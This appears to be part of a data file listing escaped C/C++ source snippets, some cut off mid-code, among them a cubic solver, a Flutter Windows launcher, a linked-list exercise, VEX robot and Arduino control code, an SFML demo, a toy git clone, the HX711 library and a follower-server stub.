{\n        dscr = sqrt(dscr);\n        x[0] = (-b+dscr)/(2*a);\n        x[1] = (-b-dscr)/(2*a);\n        return 2;\n    } else if (dscr == 0) {\n        x[0] = -b/(2*a);\n        return 1;\n    } else\n        return 0;\n}\n\nstatic int solveCubicNormed(double x[3], double a, double b, double c) {\n    double a2 = a*a;\n    double q = 1/9.*(a2-3*b);\n    double r = 1/54.*(a*(2*a2-9*b)+27*c);\n    double r2 = r*r;\n    double q3 = q*q*q;\n    a *= 1/3.;\n    if (r2 < q3) {\n        double t = r/sqrt(q3);\n        if (t < -1) t = -1;\n        if (t > 1) t = 1;\n        t = acos(t);\n        q = -2*sqrt(q);\n        x[0] = q*cos(1/3.*t)-a;\n        x[1] = q*cos(1/3.*(t+2*M_PI))-a;\n        x[2] = q*cos(1/3.*(t-2*M_PI))-a;\n        return 3;\n    } else {\n        double u = (r < 0 ? 1 : -1)*MSDFGEN_CUBE_ROOT(fabs(r)+sqrt(r2-q3));\n        double v = u == 0 ? 0 : q/u;\n        x[0] = (u+v)-a;\n        if (u == v || fabs(u-v) < 1e-12*fabs(u+v)) {\n            x[1] = -.5*(u+v)-a;\n            return 2;\n        }\n        return 1;\n    }\n}\n\nint solveCubic(double x[3], double a, double b, double c, double d) {\n    if (a != 0) {\n        double bn = b/a;\n        if (fabs(bn) < 1e6) // Above this ratio, the numerical error gets larger than if we treated a as zero\n            return solveCubicNormed(x, bn, c/a, d/a);\n    }\n    return solveQuadratic(x, b, c, d);\n}\n\nProjection::Projection() : scale(1), translate(0) { }\n\nProjection::Projection(const Vector2 &scale, const Vector2 &translate) : scale(scale), translate(translate) { }\n\nPoint2 Projection::project(const Point2 &coord) const {\n    return scale*(coord+translate);\n}\n\nPoint2 Projection::unproject(const Point2 &coord) const {\n    return coord/scale-translate;\n}\n\nVector2 Projection::projectVector(const Vector2 &vector) const {\n    return scale*vector;\n}\n\nVector2 Projection::unprojectVector(const Vector2 &vector) const {\n    return vector/scale;\n}\n\ndouble Projection::projectX(double x) const {\n    return scale.x*(x+translate.x);\n}\n\ndouble Projection::projectY(double y) const {\n    return scale.y*(y+translate.y);\n}\n\ndouble Projection::unprojectX(double x) const {\n    return x/scale.x-translate.x;\n}\n\ndouble Projection::unprojectY(double y) const {\n    return y/scale.y-translate.y;\n}\n\nDistanceMapping DistanceMapping::inverse(Range range) {\n    double rangeWidth = range.upper-range.lower;\n    return DistanceMapping(rangeWidth, range.lower/(rangeWidth ? rangeWidth : 1));\n}\n\nDistanceMapping::DistanceMapping() : scale(1), translate(0) { }\n\nDistanceMapping::DistanceMapping(Range range) : scale(1/(range.upper-range.lower)), t",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"birth_day\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<iostream>\n\n/*\n  Delete first - have a 2 Possibbleties\n  Delete Last - have a 3 Possibbleties\n  Delete Position - have a 4 Possibbleties\n*/\n\nusing namespace std;\n\nstruct Node\n{\n    int data;\n    Node *next;\n};\n\nNode *head = NULL;\n\nvoid Insert(int n){\n    Node *newNode = new Node;\n    newNode ->data = n;\n    newNode ->next = head;\n    head = newNode;\n}\n\nvoid deleteFirstNode(){\n    if (head == NULL)\n    {\n        cout<<\"List is Empty: Nothing to Delete\"<<endl;\n        return;\n    }\n    Node *temp = head;\n    head = head->next;\n    delete temp;    \n}\n\nvoid deleteLastNode(){\n    if (head == NULL)\n    {\n        cout<<\"List is Empty: Nothing to Delete\"<<endl;\n        return;\n    }\n    if (head->next == NULL)\n    {\n        delete head;\n        head = NULL;\n        return;\n    }\n    Node *temp = head;\n    while (temp->next->next !=NULL)\n    {\n        temp = temp->next;\n    }\n    delete temp->next;\n    temp->next = NULL;\n     \n}\n\nvoid deleteNodeAtPosition(int position){\n    if (head == NULL)\n    {\n        cout<<\"List is Empty: Nothing to Delete\"<<endl;\n        return;\n    }\n    Node *temp = head;\n    if (position == 1)\n    {\n       head = temp->next;\n       delete temp;\n       return;\n    }\n    for (int i = 1; temp !=NULL && i< position-1; i++)\n    {\n        temp = temp->next;\n    }\n    if (temp == NULL && temp->next == NULL)\n    {\n        cout<<\"Position\"<<position<<\"Does not exist in the list\"<<endl;\n        return;\n    }\n    Node *next = temp->next->next;\n    delete temp->next;\n    temp->next = next;\n  \n}\n\nvoid Print(){\n    cout<<\"Data Element in the single liked list is here :\";\n    Node *temp = head;\n    while (temp!=NULL)\n    {\n        cout<<temp->data<<\" \";\n        temp = temp->next;\n    }\n    \n}\n\nint main()\n{\n    Insert(1);\n    Insert(3);\n    Insert(6);\n    Insert(2);\n    Insert(4);\n    Insert(5);\n    Insert(9);\n    // deleteFirstNode();\n    // deleteLastNode();\n    deleteNodeAtPosition(3);\n    Print();\n    return 0;\n}",
    "/*----------------------------------------------------------------------------*/\n/*                                                                            */\n/*    Module:       main.cpp                                                  */\n/*    Author:       Theron Tyler                                              */\n/*    Created:      9/20/2024, 8:15:00 AM                                     */\n/*    Description:  V5 project                                                */\n/*                                                                            */\n/*----------------------------------------------------------------------------*/\n\n#include \"setup.h\"\n//#include \"turnHeading.h\"\n\nusing namespace vex;\n\n// A global instance of competition\nvoid pre_auton(void) {\n\n//Speed\nintake.setVelocity(95,pct);\n\n//Stopping\nmotor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).setStopping(brake);\nintake.setStopping(coast);\n}\n\nvoid load(){\n  intake.spin(fwd);\n  ai.takeSnapshot(aivision::ALL_COLORS);\n  if(ai.objectCount){\n    bPack.stop();\n    }\n  else{\n    bPack.spinTo(5, deg);\n  }\n}\n\nvoid mind(char cmd,float delay,float revolutions) {\n  switch (cmd) {\n  case 'w': //forward motion\n    motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).setVelocity(60, pct);\n    motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).spinFor(fwd, revolutions, rev, false);\n    wait(delay, sec);\n    motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).stop();\n    break;\n  case 's': //slow forward motion\n    motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).setVelocity(35, pct);\n    motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).spinFor(fwd, revolutions, rev, false);\n    wait(delay, sec);\n    motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).stop();\n    break;\n  case 'S': //super slow forward motion\n    motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).setVelocity(15, pct);\n    motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).spinFor(fwd, revolutions, rev, false);\n    wait(delay, sec);\n    motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).stop();\n    break;\n  case 'a': //clockwise turn\n    motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).setVelocity(70, pct);\n    motor_group(fLDrive, bLDrive, mLDrive ).spinFor(fwd, revolutions, rev, false);\n    motor_group(fRDrive, bRDrive, mRDrive).spinFor(reverse, revolutions, rev, false);\n    wait(delay, sec);\n    motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).stop();\n    break;\n  case 'i': //intake\n    intake.setVelocity(100,pct);\n    intake.spinFor(fwd, revolutions, rev, false);\n    wait(delay, sec);\n    intake.stop();\n    break;\n  }\n}\n/* ---- Possible New Auton Functions\nvoid drive(float revolutions, float speed){\n  motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).setVelocity(speed, pct);\n  motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).spinFor(fwd, revolutions, rev);\n}\n\nvoid turnLeft(float revolutions, float speed){\n  motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).setVelocity(speed, pct);\n  motor_group(fLDrive, bLDrive, mLDrive ).spinFor(reverse, revolutions, rev, false);\n  motor_group(fRDrive, bRDrive, mLDrive).spinFor(fwd, revolutions, rev, false);\n}\n\nvoid turnRight(float revolutions, float speed){\n  motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).setVelocity(soeed, pct);\n  motor_group(fLDrive, bLDrive, mLDrive ).spinFor(fwd, revolutions, rev, false);\n  motor_group(fRDrive, bRDrive, mLDrive).spinFor(reverse, revolutions, rev, false);\n}\n*/\n\nvoid autonomous(void) {\nmind('w',.4,-.5); //goal\nmoGo.set(true);\nintake.spinFor(fwd, 60, rev, false); //first ring\nwait(.5, sec);\nmind('a',1,0.87); \nmind('w',1,.7); //second ring\nwait(.5, sec);\nmind('a',1,-0.38);\nmind('w',1,.8); //third ring\nwait(.3, sec);\nmind('a',1,-0.4);\nmind('S',3,0.65); //fourth ring\nwait(.3, sec);\nmind('S',3,0.65); //fifth ring\nmind('w',1,-0.4); \nmind('a',1,0.5);\nmind('w',1,0.4); //sixth ring\nwait(.3, sec);\nmind('w',1,-0.4);\nmind('a',1,0.5);\nmind('w',1,-0.7);\nmoGo.set(false); //goal in corner\nmind('w',1,0.4);\nmind('a',1,0.9);\nmind('w',1,-3);\n\n\n}\nvoid usercontrol(void) {\nwhile (1) {\n  //Drive\n  int rotational = Controller.Axis3.position(pct);\n  int lateral = Controller.Axis1.position(pct);\n\n  motor_group(fLDrive, bLDrive, mLDrive).spin(fwd,lateral + rotational,pct);\n  motor_group(fRDrive, bRDrive, mRDrive).spin(reverse,lateral - rotational,pct);\n  \n  //Intake\n  if (Controller.ButtonL1.pressing()) {\n    intake.spin(fwd, 80, pct);\n  }\n  else if (Controller.ButtonL2.pressing()) {\n    intake.spin(reverse, 80, pct);\n  }\n  else {\n    intake.stop();\n  }\n\n  //Moble Goal\n  if (Controller.ButtonB.pressing()) {\n    moGo.set(true);\n  }\n  else if (Controller.ButtonDown.pressing()) {\n    moGo.set(false);\n  }\n\n  //Doinker\n  if (Controller.ButtonLeft.pressing()) {\n    doinker.set(true);\n  }\n  else if (",
    "#include <Arduino.h>\n#include <MotorControl.h>\n#include \"wifiMQTT.h\"\n#include \"IMU6050_v2.h\"\n#include <encoder.h>\n#include <VelocityController.h>\n\nunsigned int count = 0;\nunsigned long prevTimeCount = micros();\nunsigned int countTiltPID = 0;\nunsigned long prevLoop = micros();\nfloat targetAngle = 0;\n\nint pwm;\n\nvoid setup() {\n  Serial.begin(115200);\n  setUpPWM();\n  MQTTSetup();\n  IMU6050setup();\n  Serial.println(\"setup over\");\n}\n\nvoid loop()\n{\n  MQTTLoop();\n\n  if (countTiltPID == 4) {\n    targetAngle = CalcTargetAngle(0, getTotalTicks(), getTickRate());\n    countTiltPID = 0;\n  }\n\n  if (IMU6050loop()) {\n  pwm = CalcMotorPower(targetAngle,pitchV2,pitchRateV2);\n  setPWM(pwm);\n  countTiltPID++;\n  }\n  \n  if (micros() - prevTimeCount > 1000000) \n  {\n    Serial.print(\"Hz: \");\n    Serial.println(count);\n    Serial.print(\"Pitch: \");\n    Serial.println(pitchV2);\n    Serial.print(\"Rate: \");\n    Serial.println(pitchRateV2);\n    Serial.print(\"PWM: \");\n    Serial.println(pwm);\n    count = 0;\n    prevTimeCount = micros();\n  }\n  count++;\n}\n",
    "\n#include <SFML/Graphics.hpp>\n#include <iostream>\n\nclass Point2D {\npublic:\n    float x, y;\n\n    Point2D(float x = 0, float y = 0) : x(x), y(y) {}\n\n    // Przesuni\u0119cie punktu\n    void move(float dx, float dy) {\n        x += dx;\n        y += dy;\n    }\n};\nclass InputHandler {\npublic:\n    bool isKeyPressed(sf::Keyboard::Key key) {\n        return sf::Keyboard::isKeyPressed(key);\n    }\n\n    Point2D getMousePosition(const sf::RenderWindow& window) {\n        sf::Vector2i mousePos = sf::Mouse::getPosition(window);\n        return Point2D(static_cast<float>(mousePos.x), static_cast<float>(mousePos.y));\n    }\n};\nclass Renderer {\npublic:\n    void drawPoint(sf::RenderWindow& window, const Point2D& point) {\n        sf::CircleShape shape(5);\n        shape.setPosition(point.x, point.y);\n        shape.setFillColor(sf::Color::Red);\n        window.draw(shape);\n    }\n\n    void drawLine(sf::RenderWindow& window, const Point2D& start, const Point2D& end) {\n        sf::Vertex line[] = {\n            sf::Vertex(sf::Vector2f(start.x, start.y)),\n            sf::Vertex(sf::Vector2f(end.x, end.y))\n        };\n        window.draw(line, 2, sf::Lines);\n    }\n\n    void drawRectangle(sf::RenderWindow& window, const Point2D& topLeft, float width, float height) {\n        sf::RectangleShape rectangle(sf::Vector2f(width, height));\n        rectangle.setPosition(topLeft.x, topLeft.y);\n        rectangle.setFillColor(sf::Color::Green);\n        window.draw(rectangle);\n    }\n};\nint main() {\n    sf::RenderWindow window(sf::VideoMode(800, 600), \"2D Silnik\");\n\n    Point2D point(100, 100);\n    InputHandler input;\n    Renderer renderer;\n\n    while (window.isOpen()) {\n        sf::Event event;\n        while (window.pollEvent(event)) {\n            if (event.type == sf::Event::Closed)\n                window.close();\n        }\n\n        // Obs\u0142uga wej\u015bcia - przesuwanie punktu klawiszami strza\u0142ek\n        if (input.isKeyPressed(sf::Keyboard::Left)) {\n            point.move(-1, 0);\n        }\n        if (input.isKeyPressed(sf::Keyboard::Right)) {\n            point.move(1, 0);\n        }\n        if (input.isKeyPressed(sf::Keyboard::Up)) {\n            point.move(0, -1);\n        }\n        if (input.isKeyPressed(sf::Keyboard::Down)) {\n            point.move(0, 1);\n        }\n\n        // Wy\u015bwietlanie wsp\u00f3\u0142rz\u0119dnych myszy w konsoli\n        Point2D mousePos = input.getMousePosition(window);\n        std::cout << \"Mouse Position: (\" << mousePos.x << \", \" << mousePos.y << \")\\n\";\n\n        // Rysowanie\n        window.clear();\n        renderer.drawPoint(window, point);\n        renderer.drawRectangle(window, Point2D(300, 350), 100, 50);\n        renderer.drawLine(window, Point2D(300, 300), mousePos);\n        window.display();\n    }\n\n    return 0;\n}\n\n",
    "#include <iostream>\n#include <filesystem>\n#include <fstream>\n#include <string>\n#include <bits/stdc++.h>\n#include <zlib.h>\n#include \"utils.h\"\n\n\nusing namespace std;\n\nint main(int argc, char *argv[])\n{\n    // Flush after every cout / cerr\n    cout << unitbuf;\n    cerr << unitbuf;\n\n    // You can use print statements as follows for debugging, they'll be visible when running tests.\n    // cout << \"Logs from your program will appear here!\\n\";\n\n    if (argc < 2) {\n        cerr << \"No command provided.\\n\";\n        return EXIT_FAILURE;\n    }\n    \n    string command = argv[1];\n\n    // cout << command << \"  \";\n    if (command == \"init\") {\n        try {\n            filesystem::create_directory(\".git\");\n            filesystem::create_directory(\".git/objects\");\n            filesystem::create_directory(\".git/refs\");\n            filesystem::create_directory(\".git/refs/heads\");\n            filesystem::create_directory(\".git/refs/heads\");\n            filesystem::create_directory(\".git/logs\");\n\n            filesystem::create_directory(\".git/logs/refs\");\n            filesystem::create_directory(\".git/logs/refs/heads\");\n\n    \n            ofstream headFile(\".git/HEAD\");\n\n            if (headFile.is_open()) {\n                headFile << \"ref: refs/heads/main\\n\";\n                headFile.close();\n            } else {\n                cerr << \"Failed to create .git/HEAD file.\\n\";\n                return EXIT_FAILURE;\n            }\n            headFile.close();\n    \n            cout << \"Initialized git directory\\n\";\n        } \n        catch (const filesystem::filesystem_error& e) {\n            cerr << e.what() << '\\n';\n            return EXIT_FAILURE;\n        }\n    }\n\n    else {\n        if(!filesystem::exists(\"./.git\") || !filesystem::is_directory(\"./.git\")) {\n            cerr << \"Incorrect command (parentSha should be of 40 char)\" << endl;\n            return EXIT_FAILURE;\n        }\n        if(command == \"cat-file\") {\n            try {\n                if (argc < 4) {  // Corrected from 3 to 4 to account for fileSHA\n                    cerr << \"Incorrect command(git cat-file options <file-sha>)\" << endl;\n                    return EXIT_FAILURE;\n                }\n\n                string option = argv[2];\n                \n                if (option != \"-p\" && option != \"-t\" && option != \"-s\") {\n                    cerr << \"Incorrect command(git cat-file options <file-sha>)\" << endl;\n                    return EXIT_FAILURE;\n                }\n\n                string fileSha = argv[3];\n                if(fileSha.size() != 40) {\n                    cerr << \"Invalid Git blob hash length.\\n\";\n                    return EXIT_FAILURE;\n                }\n\n\n                decompressZlib(fileSha, option);\n            } \n            catch (const runtime_error& e) {\n                cerr << \"Error: \" << e.what() << endl;\n                return EXIT_FAILURE;\n            }\n            catch (const exception& e) {\n                cerr << \"Unexpected error: \" << e.what() << endl;\n                return EXIT_FAILURE;\n            } \n            catch (...) {\n                cerr << \"An unknown error occurred.\" << endl;\n                return EXIT_FAILURE;\n            }    \n        }\n\n        else if (command == \"hash-object\") {\n            try {\n                if (argc < 4 || string(argv[2]) != \"-w\") {\n                    cout << \"Incorrect command(git hash-object -w <file-name>)\" << endl;\n                    return EXIT_FAILURE;\n                }\n\n                string option = argv[2];\n                string fileName = argv[3];\n            \n                // cout << objectFileName << \"\\n\";\n                // cout << fileName << \"\\n\";\n                string fileContent = readFile(fileName);\n                // cout << fileContent << \"\\n\"\n                \n                string blobHeader = \"blob \" + to_string(fileContent.size()) + '\\0';\n                string blobContent = blobHeader + fileContent;\n\n                string sha1 = getShaOfContent(blobContent);\n                string hexSha = getHexSha(sha1);\n                string compressBlobContent = compressContent(blobContent);\n                storeCompressDataInFile(compressBlobContent, hexSha);\n\n                cout << hexSha << \"\\n\";\n            } \n            catch (const runtime_error& e) {\n                cerr << \"Error: \" << e.what() << endl;\n                return EXIT_FAILURE;\n            } \n            catch (const exception& e) {\n                cerr << \"Unexpected error: \" << e.what() << endl;\n                return EXIT_FAILURE;\n            } \n            catch (...) {\n                cerr << \"An unknown error occurred.\" << endl;\n                return EXIT_FAILURE;\n            }\n        }\n\n        else if (command == \"ls-tree\") {\n            try {\n                if (argc < 3) {\n                    cerr << \"Incorrect Parameter. git ls-tree --name-only <hash>\\n\";\n                    return EXIT_FAILURE;\n                } \n                if (argc == 4 && string(argv[2]) != \"--name-only\") ",
    "/*\r\n\r\nColin Bottrill\r\nProfessor Vermilyer\r\n\r\nThis program can be used by the STAC athletics department to keep track of\r\nsport stats from a UML diagram.\r\n\r\n*/\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n#include <iostream>\r\n#include <Athlete.h>\r\n#include <VolleyBall.h>\r\n#include <Tennis.h>\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\nint main()\r\n{\r\n    Athlete sport(72, 140, 'M');\r\n    cout << \"Athlete: \" << sport.getHeight() << \" \"\r\n         << sport.getWeight() << \" \"\r\n         << sport.getGender() << endl;\r\n\r\n    VolleyBall kerri = VolleyBall();\r\n    kerri.setGender('F');\r\n    kerri.setPosition(\"Opposite Hitter\");\r\n    VolleyBall giba(\"Outside Hitter\",23.2);\r\n    giba.setGender('M');\r\n    if  (kerri.getGender() == 'F')\r\n       cout << \"Kerri is an \" << kerri.getPosition() << endl;\r\n\r\n\r\n    Tennis martina = Tennis();\r\n    martina.setServeSpeed(100);\r\n    martina.setGender('F');\r\n    Tennis bjorn(150,false);\r\n    bjorn.setGender('M');\r\n    if  (martina.getGender() == 'F')\r\n       cout << \"Martina serve speed: \" << martina.getServerSpeed() << endl;\r\n\r\n\r\n\r\n\r\n    return 0;\r\n}\r\n",
    "/**\n *\n * HX711 library for Arduino\n * https://github.com/bogde/HX711\n *\n * MIT License\n * (c) 2018 Bogdan Necula\n *\n**/\n#include <Arduino.h>\n#include \"HX711.h\"\n\n// TEENSYDUINO has a port of Dean Camera's ATOMIC_BLOCK macros for AVR to ARM Cortex M3.\n#define HAS_ATOMIC_BLOCK (defined(ARDUINO_ARCH_AVR) || defined(TEENSYDUINO))\n\n// Whether we are running on either the ESP8266 or the ESP32.\n#define ARCH_ESPRESSIF (defined(ARDUINO_ARCH_ESP8266) || defined(ARDUINO_ARCH_ESP32))\n\n// Whether we are actually running on FreeRTOS.\n#define IS_FREE_RTOS defined(ARDUINO_ARCH_ESP32)\n\n// Define macro designating whether we're running on a reasonable\n// fast CPU and so should slow down sampling from GPIO.\n#define FAST_CPU \\\n    ( \\\n    ARCH_ESPRESSIF || \\\n    defined(ARDUINO_ARCH_SAM)     || defined(ARDUINO_ARCH_SAMD) || \\\n    defined(ARDUINO_ARCH_STM32)   || defined(TEENSYDUINO) \\\n    )\n\n#if HAS_ATOMIC_BLOCK\n// Acquire AVR-specific ATOMIC_BLOCK(ATOMIC_RESTORESTATE) macro.\n#include <util/atomic.h>\n#endif\n\n#if FAST_CPU\n// Make shiftIn() be aware of clockspeed for\n// faster CPUs like ESP32, Teensy 3.x and friends.\n// See also:\n// - https://github.com/bogde/HX711/issues/75\n// - https://github.com/arduino/Arduino/issues/6561\n// - https://community.hiveeyes.org/t/using-bogdans-canonical-hx711-library-on-the-esp32/539\nuint8_t shiftInSlow(uint8_t dataPin, uint8_t clockPin, uint8_t bitOrder) {\n    uint8_t value = 0;\n    uint8_t i;\n\n    for(i = 0; i < 8; ++i) {\n        digitalWrite(clockPin, HIGH);\n        delayMicroseconds(1);\n        if(bitOrder == LSBFIRST)\n            value |= digitalRead(dataPin) << i;\n        else\n            value |= digitalRead(dataPin) << (7 - i);\n        digitalWrite(clockPin, LOW);\n        delayMicroseconds(1);\n    }\n    return value;\n}\n#define SHIFTIN_WITH_SPEED_SUPPORT(data,clock,order) shiftInSlow(data,clock,order)\n#else\n#define SHIFTIN_WITH_SPEED_SUPPORT(data,clock,order) shiftIn(data,clock,order)\n#endif\n\n#if ARCH_ESPRESSIF\n// ESP8266 doesn't read values between 0x20000 and 0x30000 when DOUT is pulled up.\n#define DOUT_MODE INPUT\n#else\n#define DOUT_MODE INPUT_PULLUP\n#endif\n\n\nHX711::HX711() {\n}\n\nHX711::~HX711() {\n}\n\nvoid HX711::begin(byte dout, byte pd_sck, byte gain) {\n\tPD_SCK = pd_sck;\n\tDOUT = dout;\n\n\tpinMode(PD_SCK, OUTPUT);\n\tpinMode(DOUT, DOUT_MODE);\n\n\tset_gain(gain);\n}\n\nbool HX711::is_ready() {\n\treturn digitalRead(DOUT) == LOW;\n}\n\nvoid HX711::set_gain(byte gain) {\n\tswitch (gain) {\n\t\tcase 128:\t\t// channel A, gain factor 128\n\t\t\tGAIN = 1;\n\t\t\tbreak;\n\t\tcase 64:\t\t// channel A, gain factor 64\n\t\t\tGAIN = 3;\n\t\t\tbreak;\n\t\tcase 32:\t\t// channel B, gain factor 32\n\t\t\tGAIN = 2;\n\t\t\tbreak;\n\t}\n\n}\n\nlong HX711::read() {\n\n\t// Wait for the chip to become ready.\n\twait_ready();\n\n\t// Define structures for reading data into.\n\tunsigned long value = 0;\n\tuint8_t data[3] = { 0 };\n\tuint8_t filler = 0x00;\n\n\t// Protect the read sequence from system interrupts.  If an interrupt occurs during\n\t// the time the PD_SCK signal is high it will stretch the length of the clock pulse.\n\t// If the total pulse time exceeds 60 uSec this will cause the HX711 to enter\n\t// power down mode during the middle of the read sequence.  While the device will\n\t// wake up when PD_SCK goes low again, the reset starts a new conversion cycle which\n\t// forces DOUT high until that cycle is completed.\n\t//\n\t// The result is that all subsequent bits read by shiftIn() will read back as 1,\n\t// corrupting the value returned by read().  The ATOMIC_BLOCK macro disables\n\t// interrupts during the sequence and then restores the interrupt mask to its previous\n\t// state after the sequence completes, insuring that the entire read-and-gain-set\n\t// sequence is not interrupted.  The macro has a few minor advantages over bracketing\n\t// the sequence between `noInterrupts()` and `interrupts()` calls.\n\t#if HAS_ATOMIC_BLOCK\n\tATOMIC_BLOCK(ATOMIC_RESTORESTATE) {\n\n\t#elif IS_FREE_RTOS\n\t// Begin of critical section.\n\t// Critical sections are used as a valid protection method\n\t// against simultaneous access in vanilla FreeRTOS.\n\t// Disable the scheduler and call portDISABLE_INTERRUPTS. This prevents\n\t// context switches and servicing of ISRs during a critical section.\n\tportMUX_TYPE mux = portMUX_INITIALIZER_UNLOCKED;\n\tportENTER_CRITICAL(&mux);\n\n\t#else\n\t// Disable interrupts.\n\tnoInterrupts();\n\t#endif\n\n\t// Pulse the clock pin 24 times to read the data.\n\tdata[2] = SHIFTIN_WITH_SPEED_SUPPORT(DOUT, PD_SCK, MSBFIRST);\n\tdata[1] = SHIFTIN_WITH_SPEED_SUPPORT(DOUT, PD_SCK, MSBFIRST);\n\tdata[0] = SHIFTIN_WITH_SPEED_SUPPORT(DOUT, PD_SCK, MSBFIRST);\n\n\t// Set the channel and the gain factor for the next reading using the clock pin.\n\tfor (unsigned int i = 0; i < GAIN; i++) {\n\t\tdigitalWrite(PD_SCK, HIGH);\n\t\t#if ARCH_ESPRESSIF\n\t\tdelayMicroseconds(1);\n\t\t#endif\n\t\tdigitalWrite(PD_SCK, LOW);\n\t\t#if ARCH_ESPRESSIF\n\t\tdelayMicroseconds(1);\n\t\t#endif\n\t}\n\n\t#if IS_FREE_RTOS\n\t// End of critical section.\n\tportEXIT_CRITICAL(&mux);\n\n\t#elif HAS_ATOMIC_BLOCK\n\t}\n\n\t#else\n\t// Enable interrupts again.\n\tinterrupts();\n\t#endif\n\n\t// R",
    "#include <iostream>\n#include <map>\n\n#include \"FollowerServer.hpp\"\n\nclass FollowerServerDelegate : public server::follower::ServerDelegate {\n  public:\n    server::follower::types::SubscribeResponse Subscribe(\n      const server::follower::types::SubscribeRequest&) override;\n    server::follower::types::UnsubscribeResponse Unsubscribe(\n      const server::follower::types::UnsubscribeRequest&) override;\n    server::follower::types::GetFollowersResponse GetFollowers(\n      const server::follower::types::GetFollowersRequest&) override;\n    server::follower::types::GetFollowingResponse GetFollowing(\n      const server::follower::types::GetFollowingRequest&) override;\n    server::follower::types::GetClientTargetsResponse GetClientTargets(\n      const server::follower::types::GetClientTargetsRequest&) {}\n};\n\nserver::follower::types::SubscribeResponse FollowerServerDelegate::Subscribe(\n  const server::follower::types::SubscribeRequest& request) {\n  std::cout << \"FollowerServerDelegate::Subscribe(client: \" << request.client\n    << \", username: \" << request.target.username\n    << \", followers: \" << request.target.followers\n    << \", following: \" << request.target.following\n    << \")\" << std::endl;\n\n  server::follower::types::SubscribeResponse response;\n  response.error = 0;\n  return response;\n}\n\nserver::follower::types::UnsubscribeResponse FollowerServerDelegate::Unsubscribe(\n  const server::follower::types::UnsubscribeRequest& request) {\n  std::cout << \"FollowerServerDelegate::Unsubscribe(client: \" << request.client\n    << \", username: \" << request.username << \")\" << std::endl;\n\n  server::follower::types::UnsubscribeResponse response;\n  response.error = 0;\n  return response;\n}\n\nserver::follower::types::GetFollowersResponse FollowerServerDelegate::GetFollowers(\n  const server::follower::types::GetFollowersRequest& request) {\n  std::cout << \"FollowerServerDelegate::GetFollowers(client: \" << request.client\n    << \", username: \" << request.username\n    << \", from: \" << request.from.date << \" - \" << request.from.time\n    << \", to: \" << request.to.date << \" - \" << request.to.time\n    << \")\" << std::endl;\n\n  server::follower::types::GetFollowersResponse response;\n  response.error = 0;\n\n  std::size_t date_counter = 1000;\n  std::size_t time_counter = 5000;\n  std::size_t un_counter = 10000;\n  for(auto i = 0; i < 10; i++) {\n    server::follower::types::Timestamp ts;\n    ts.date = std::string(std::to_string(date_counter++));\n    ts.time = std::string(std::to_string(time_counter++));\n\n    server::follower::types::Follower st;\n    st.timestamp = ts;\n    st.username = std::string(std::to_string(un_counter++));\n\n    response.all.push_back(st);\n  }\n\n  response.subscribed.insert(\n    response.subscribed.begin(),\n      response.all.begin(), response.all.begin() + 3);\n\n  response.unsubscribed.insert(\n    response.unsubscribed.begin(),\n      response.all.begin(), response.all.begin() + 5);\n\n  return response;\n}\n\nserver::follower::types::GetFollowingResponse FollowerServerDelegate::GetFollowing(\n  const server::follower::types::GetFollowingRequest& request) {\n  std::cout << \"FollowerServerDelegate::GetFollowing(client: \" << request.client\n    << \", username: \" << request.username\n    << \", from: \" << request.from.date << \" - \" << request.from.time\n    << \", to: \" << request.to.date << \" - \" << request.to.time\n    << \")\" << std::endl;\n\n  server::follower::types::GetFollowingResponse response;\n  response.error = 0;\n\n  std::size_t date_counter = 1000;\n  std::size_t time_counter = 5000;\n  std::size_t un_counter = 10000;\n  for(auto i = 0; i < 10; i++) {\n    server::follower::types::Timestamp ts;\n    ts.date = std::string(std::to_string(date_counter++));\n    ts.time = std::string(std::to_string(time_counter++));\n\n    server::follower::types::Follower st;\n    st.timestamp = ts;\n    st.username = std::string(std::to_string(un_counter++));\n\n    response.all.push_back(st);\n  }\n\n  response.subscribed.insert(\n    response.subscribed.begin(),\n      response.all.begin(), response.all.begin() + 3);\n\n  response.unsubscribed.insert(\n    response.unsubscribed.begin(),\n      response.all.begin(), response.all.begin() + 5);\n\n  return response;\n}\n\nint main() {\n  server::follower::FollowerServer 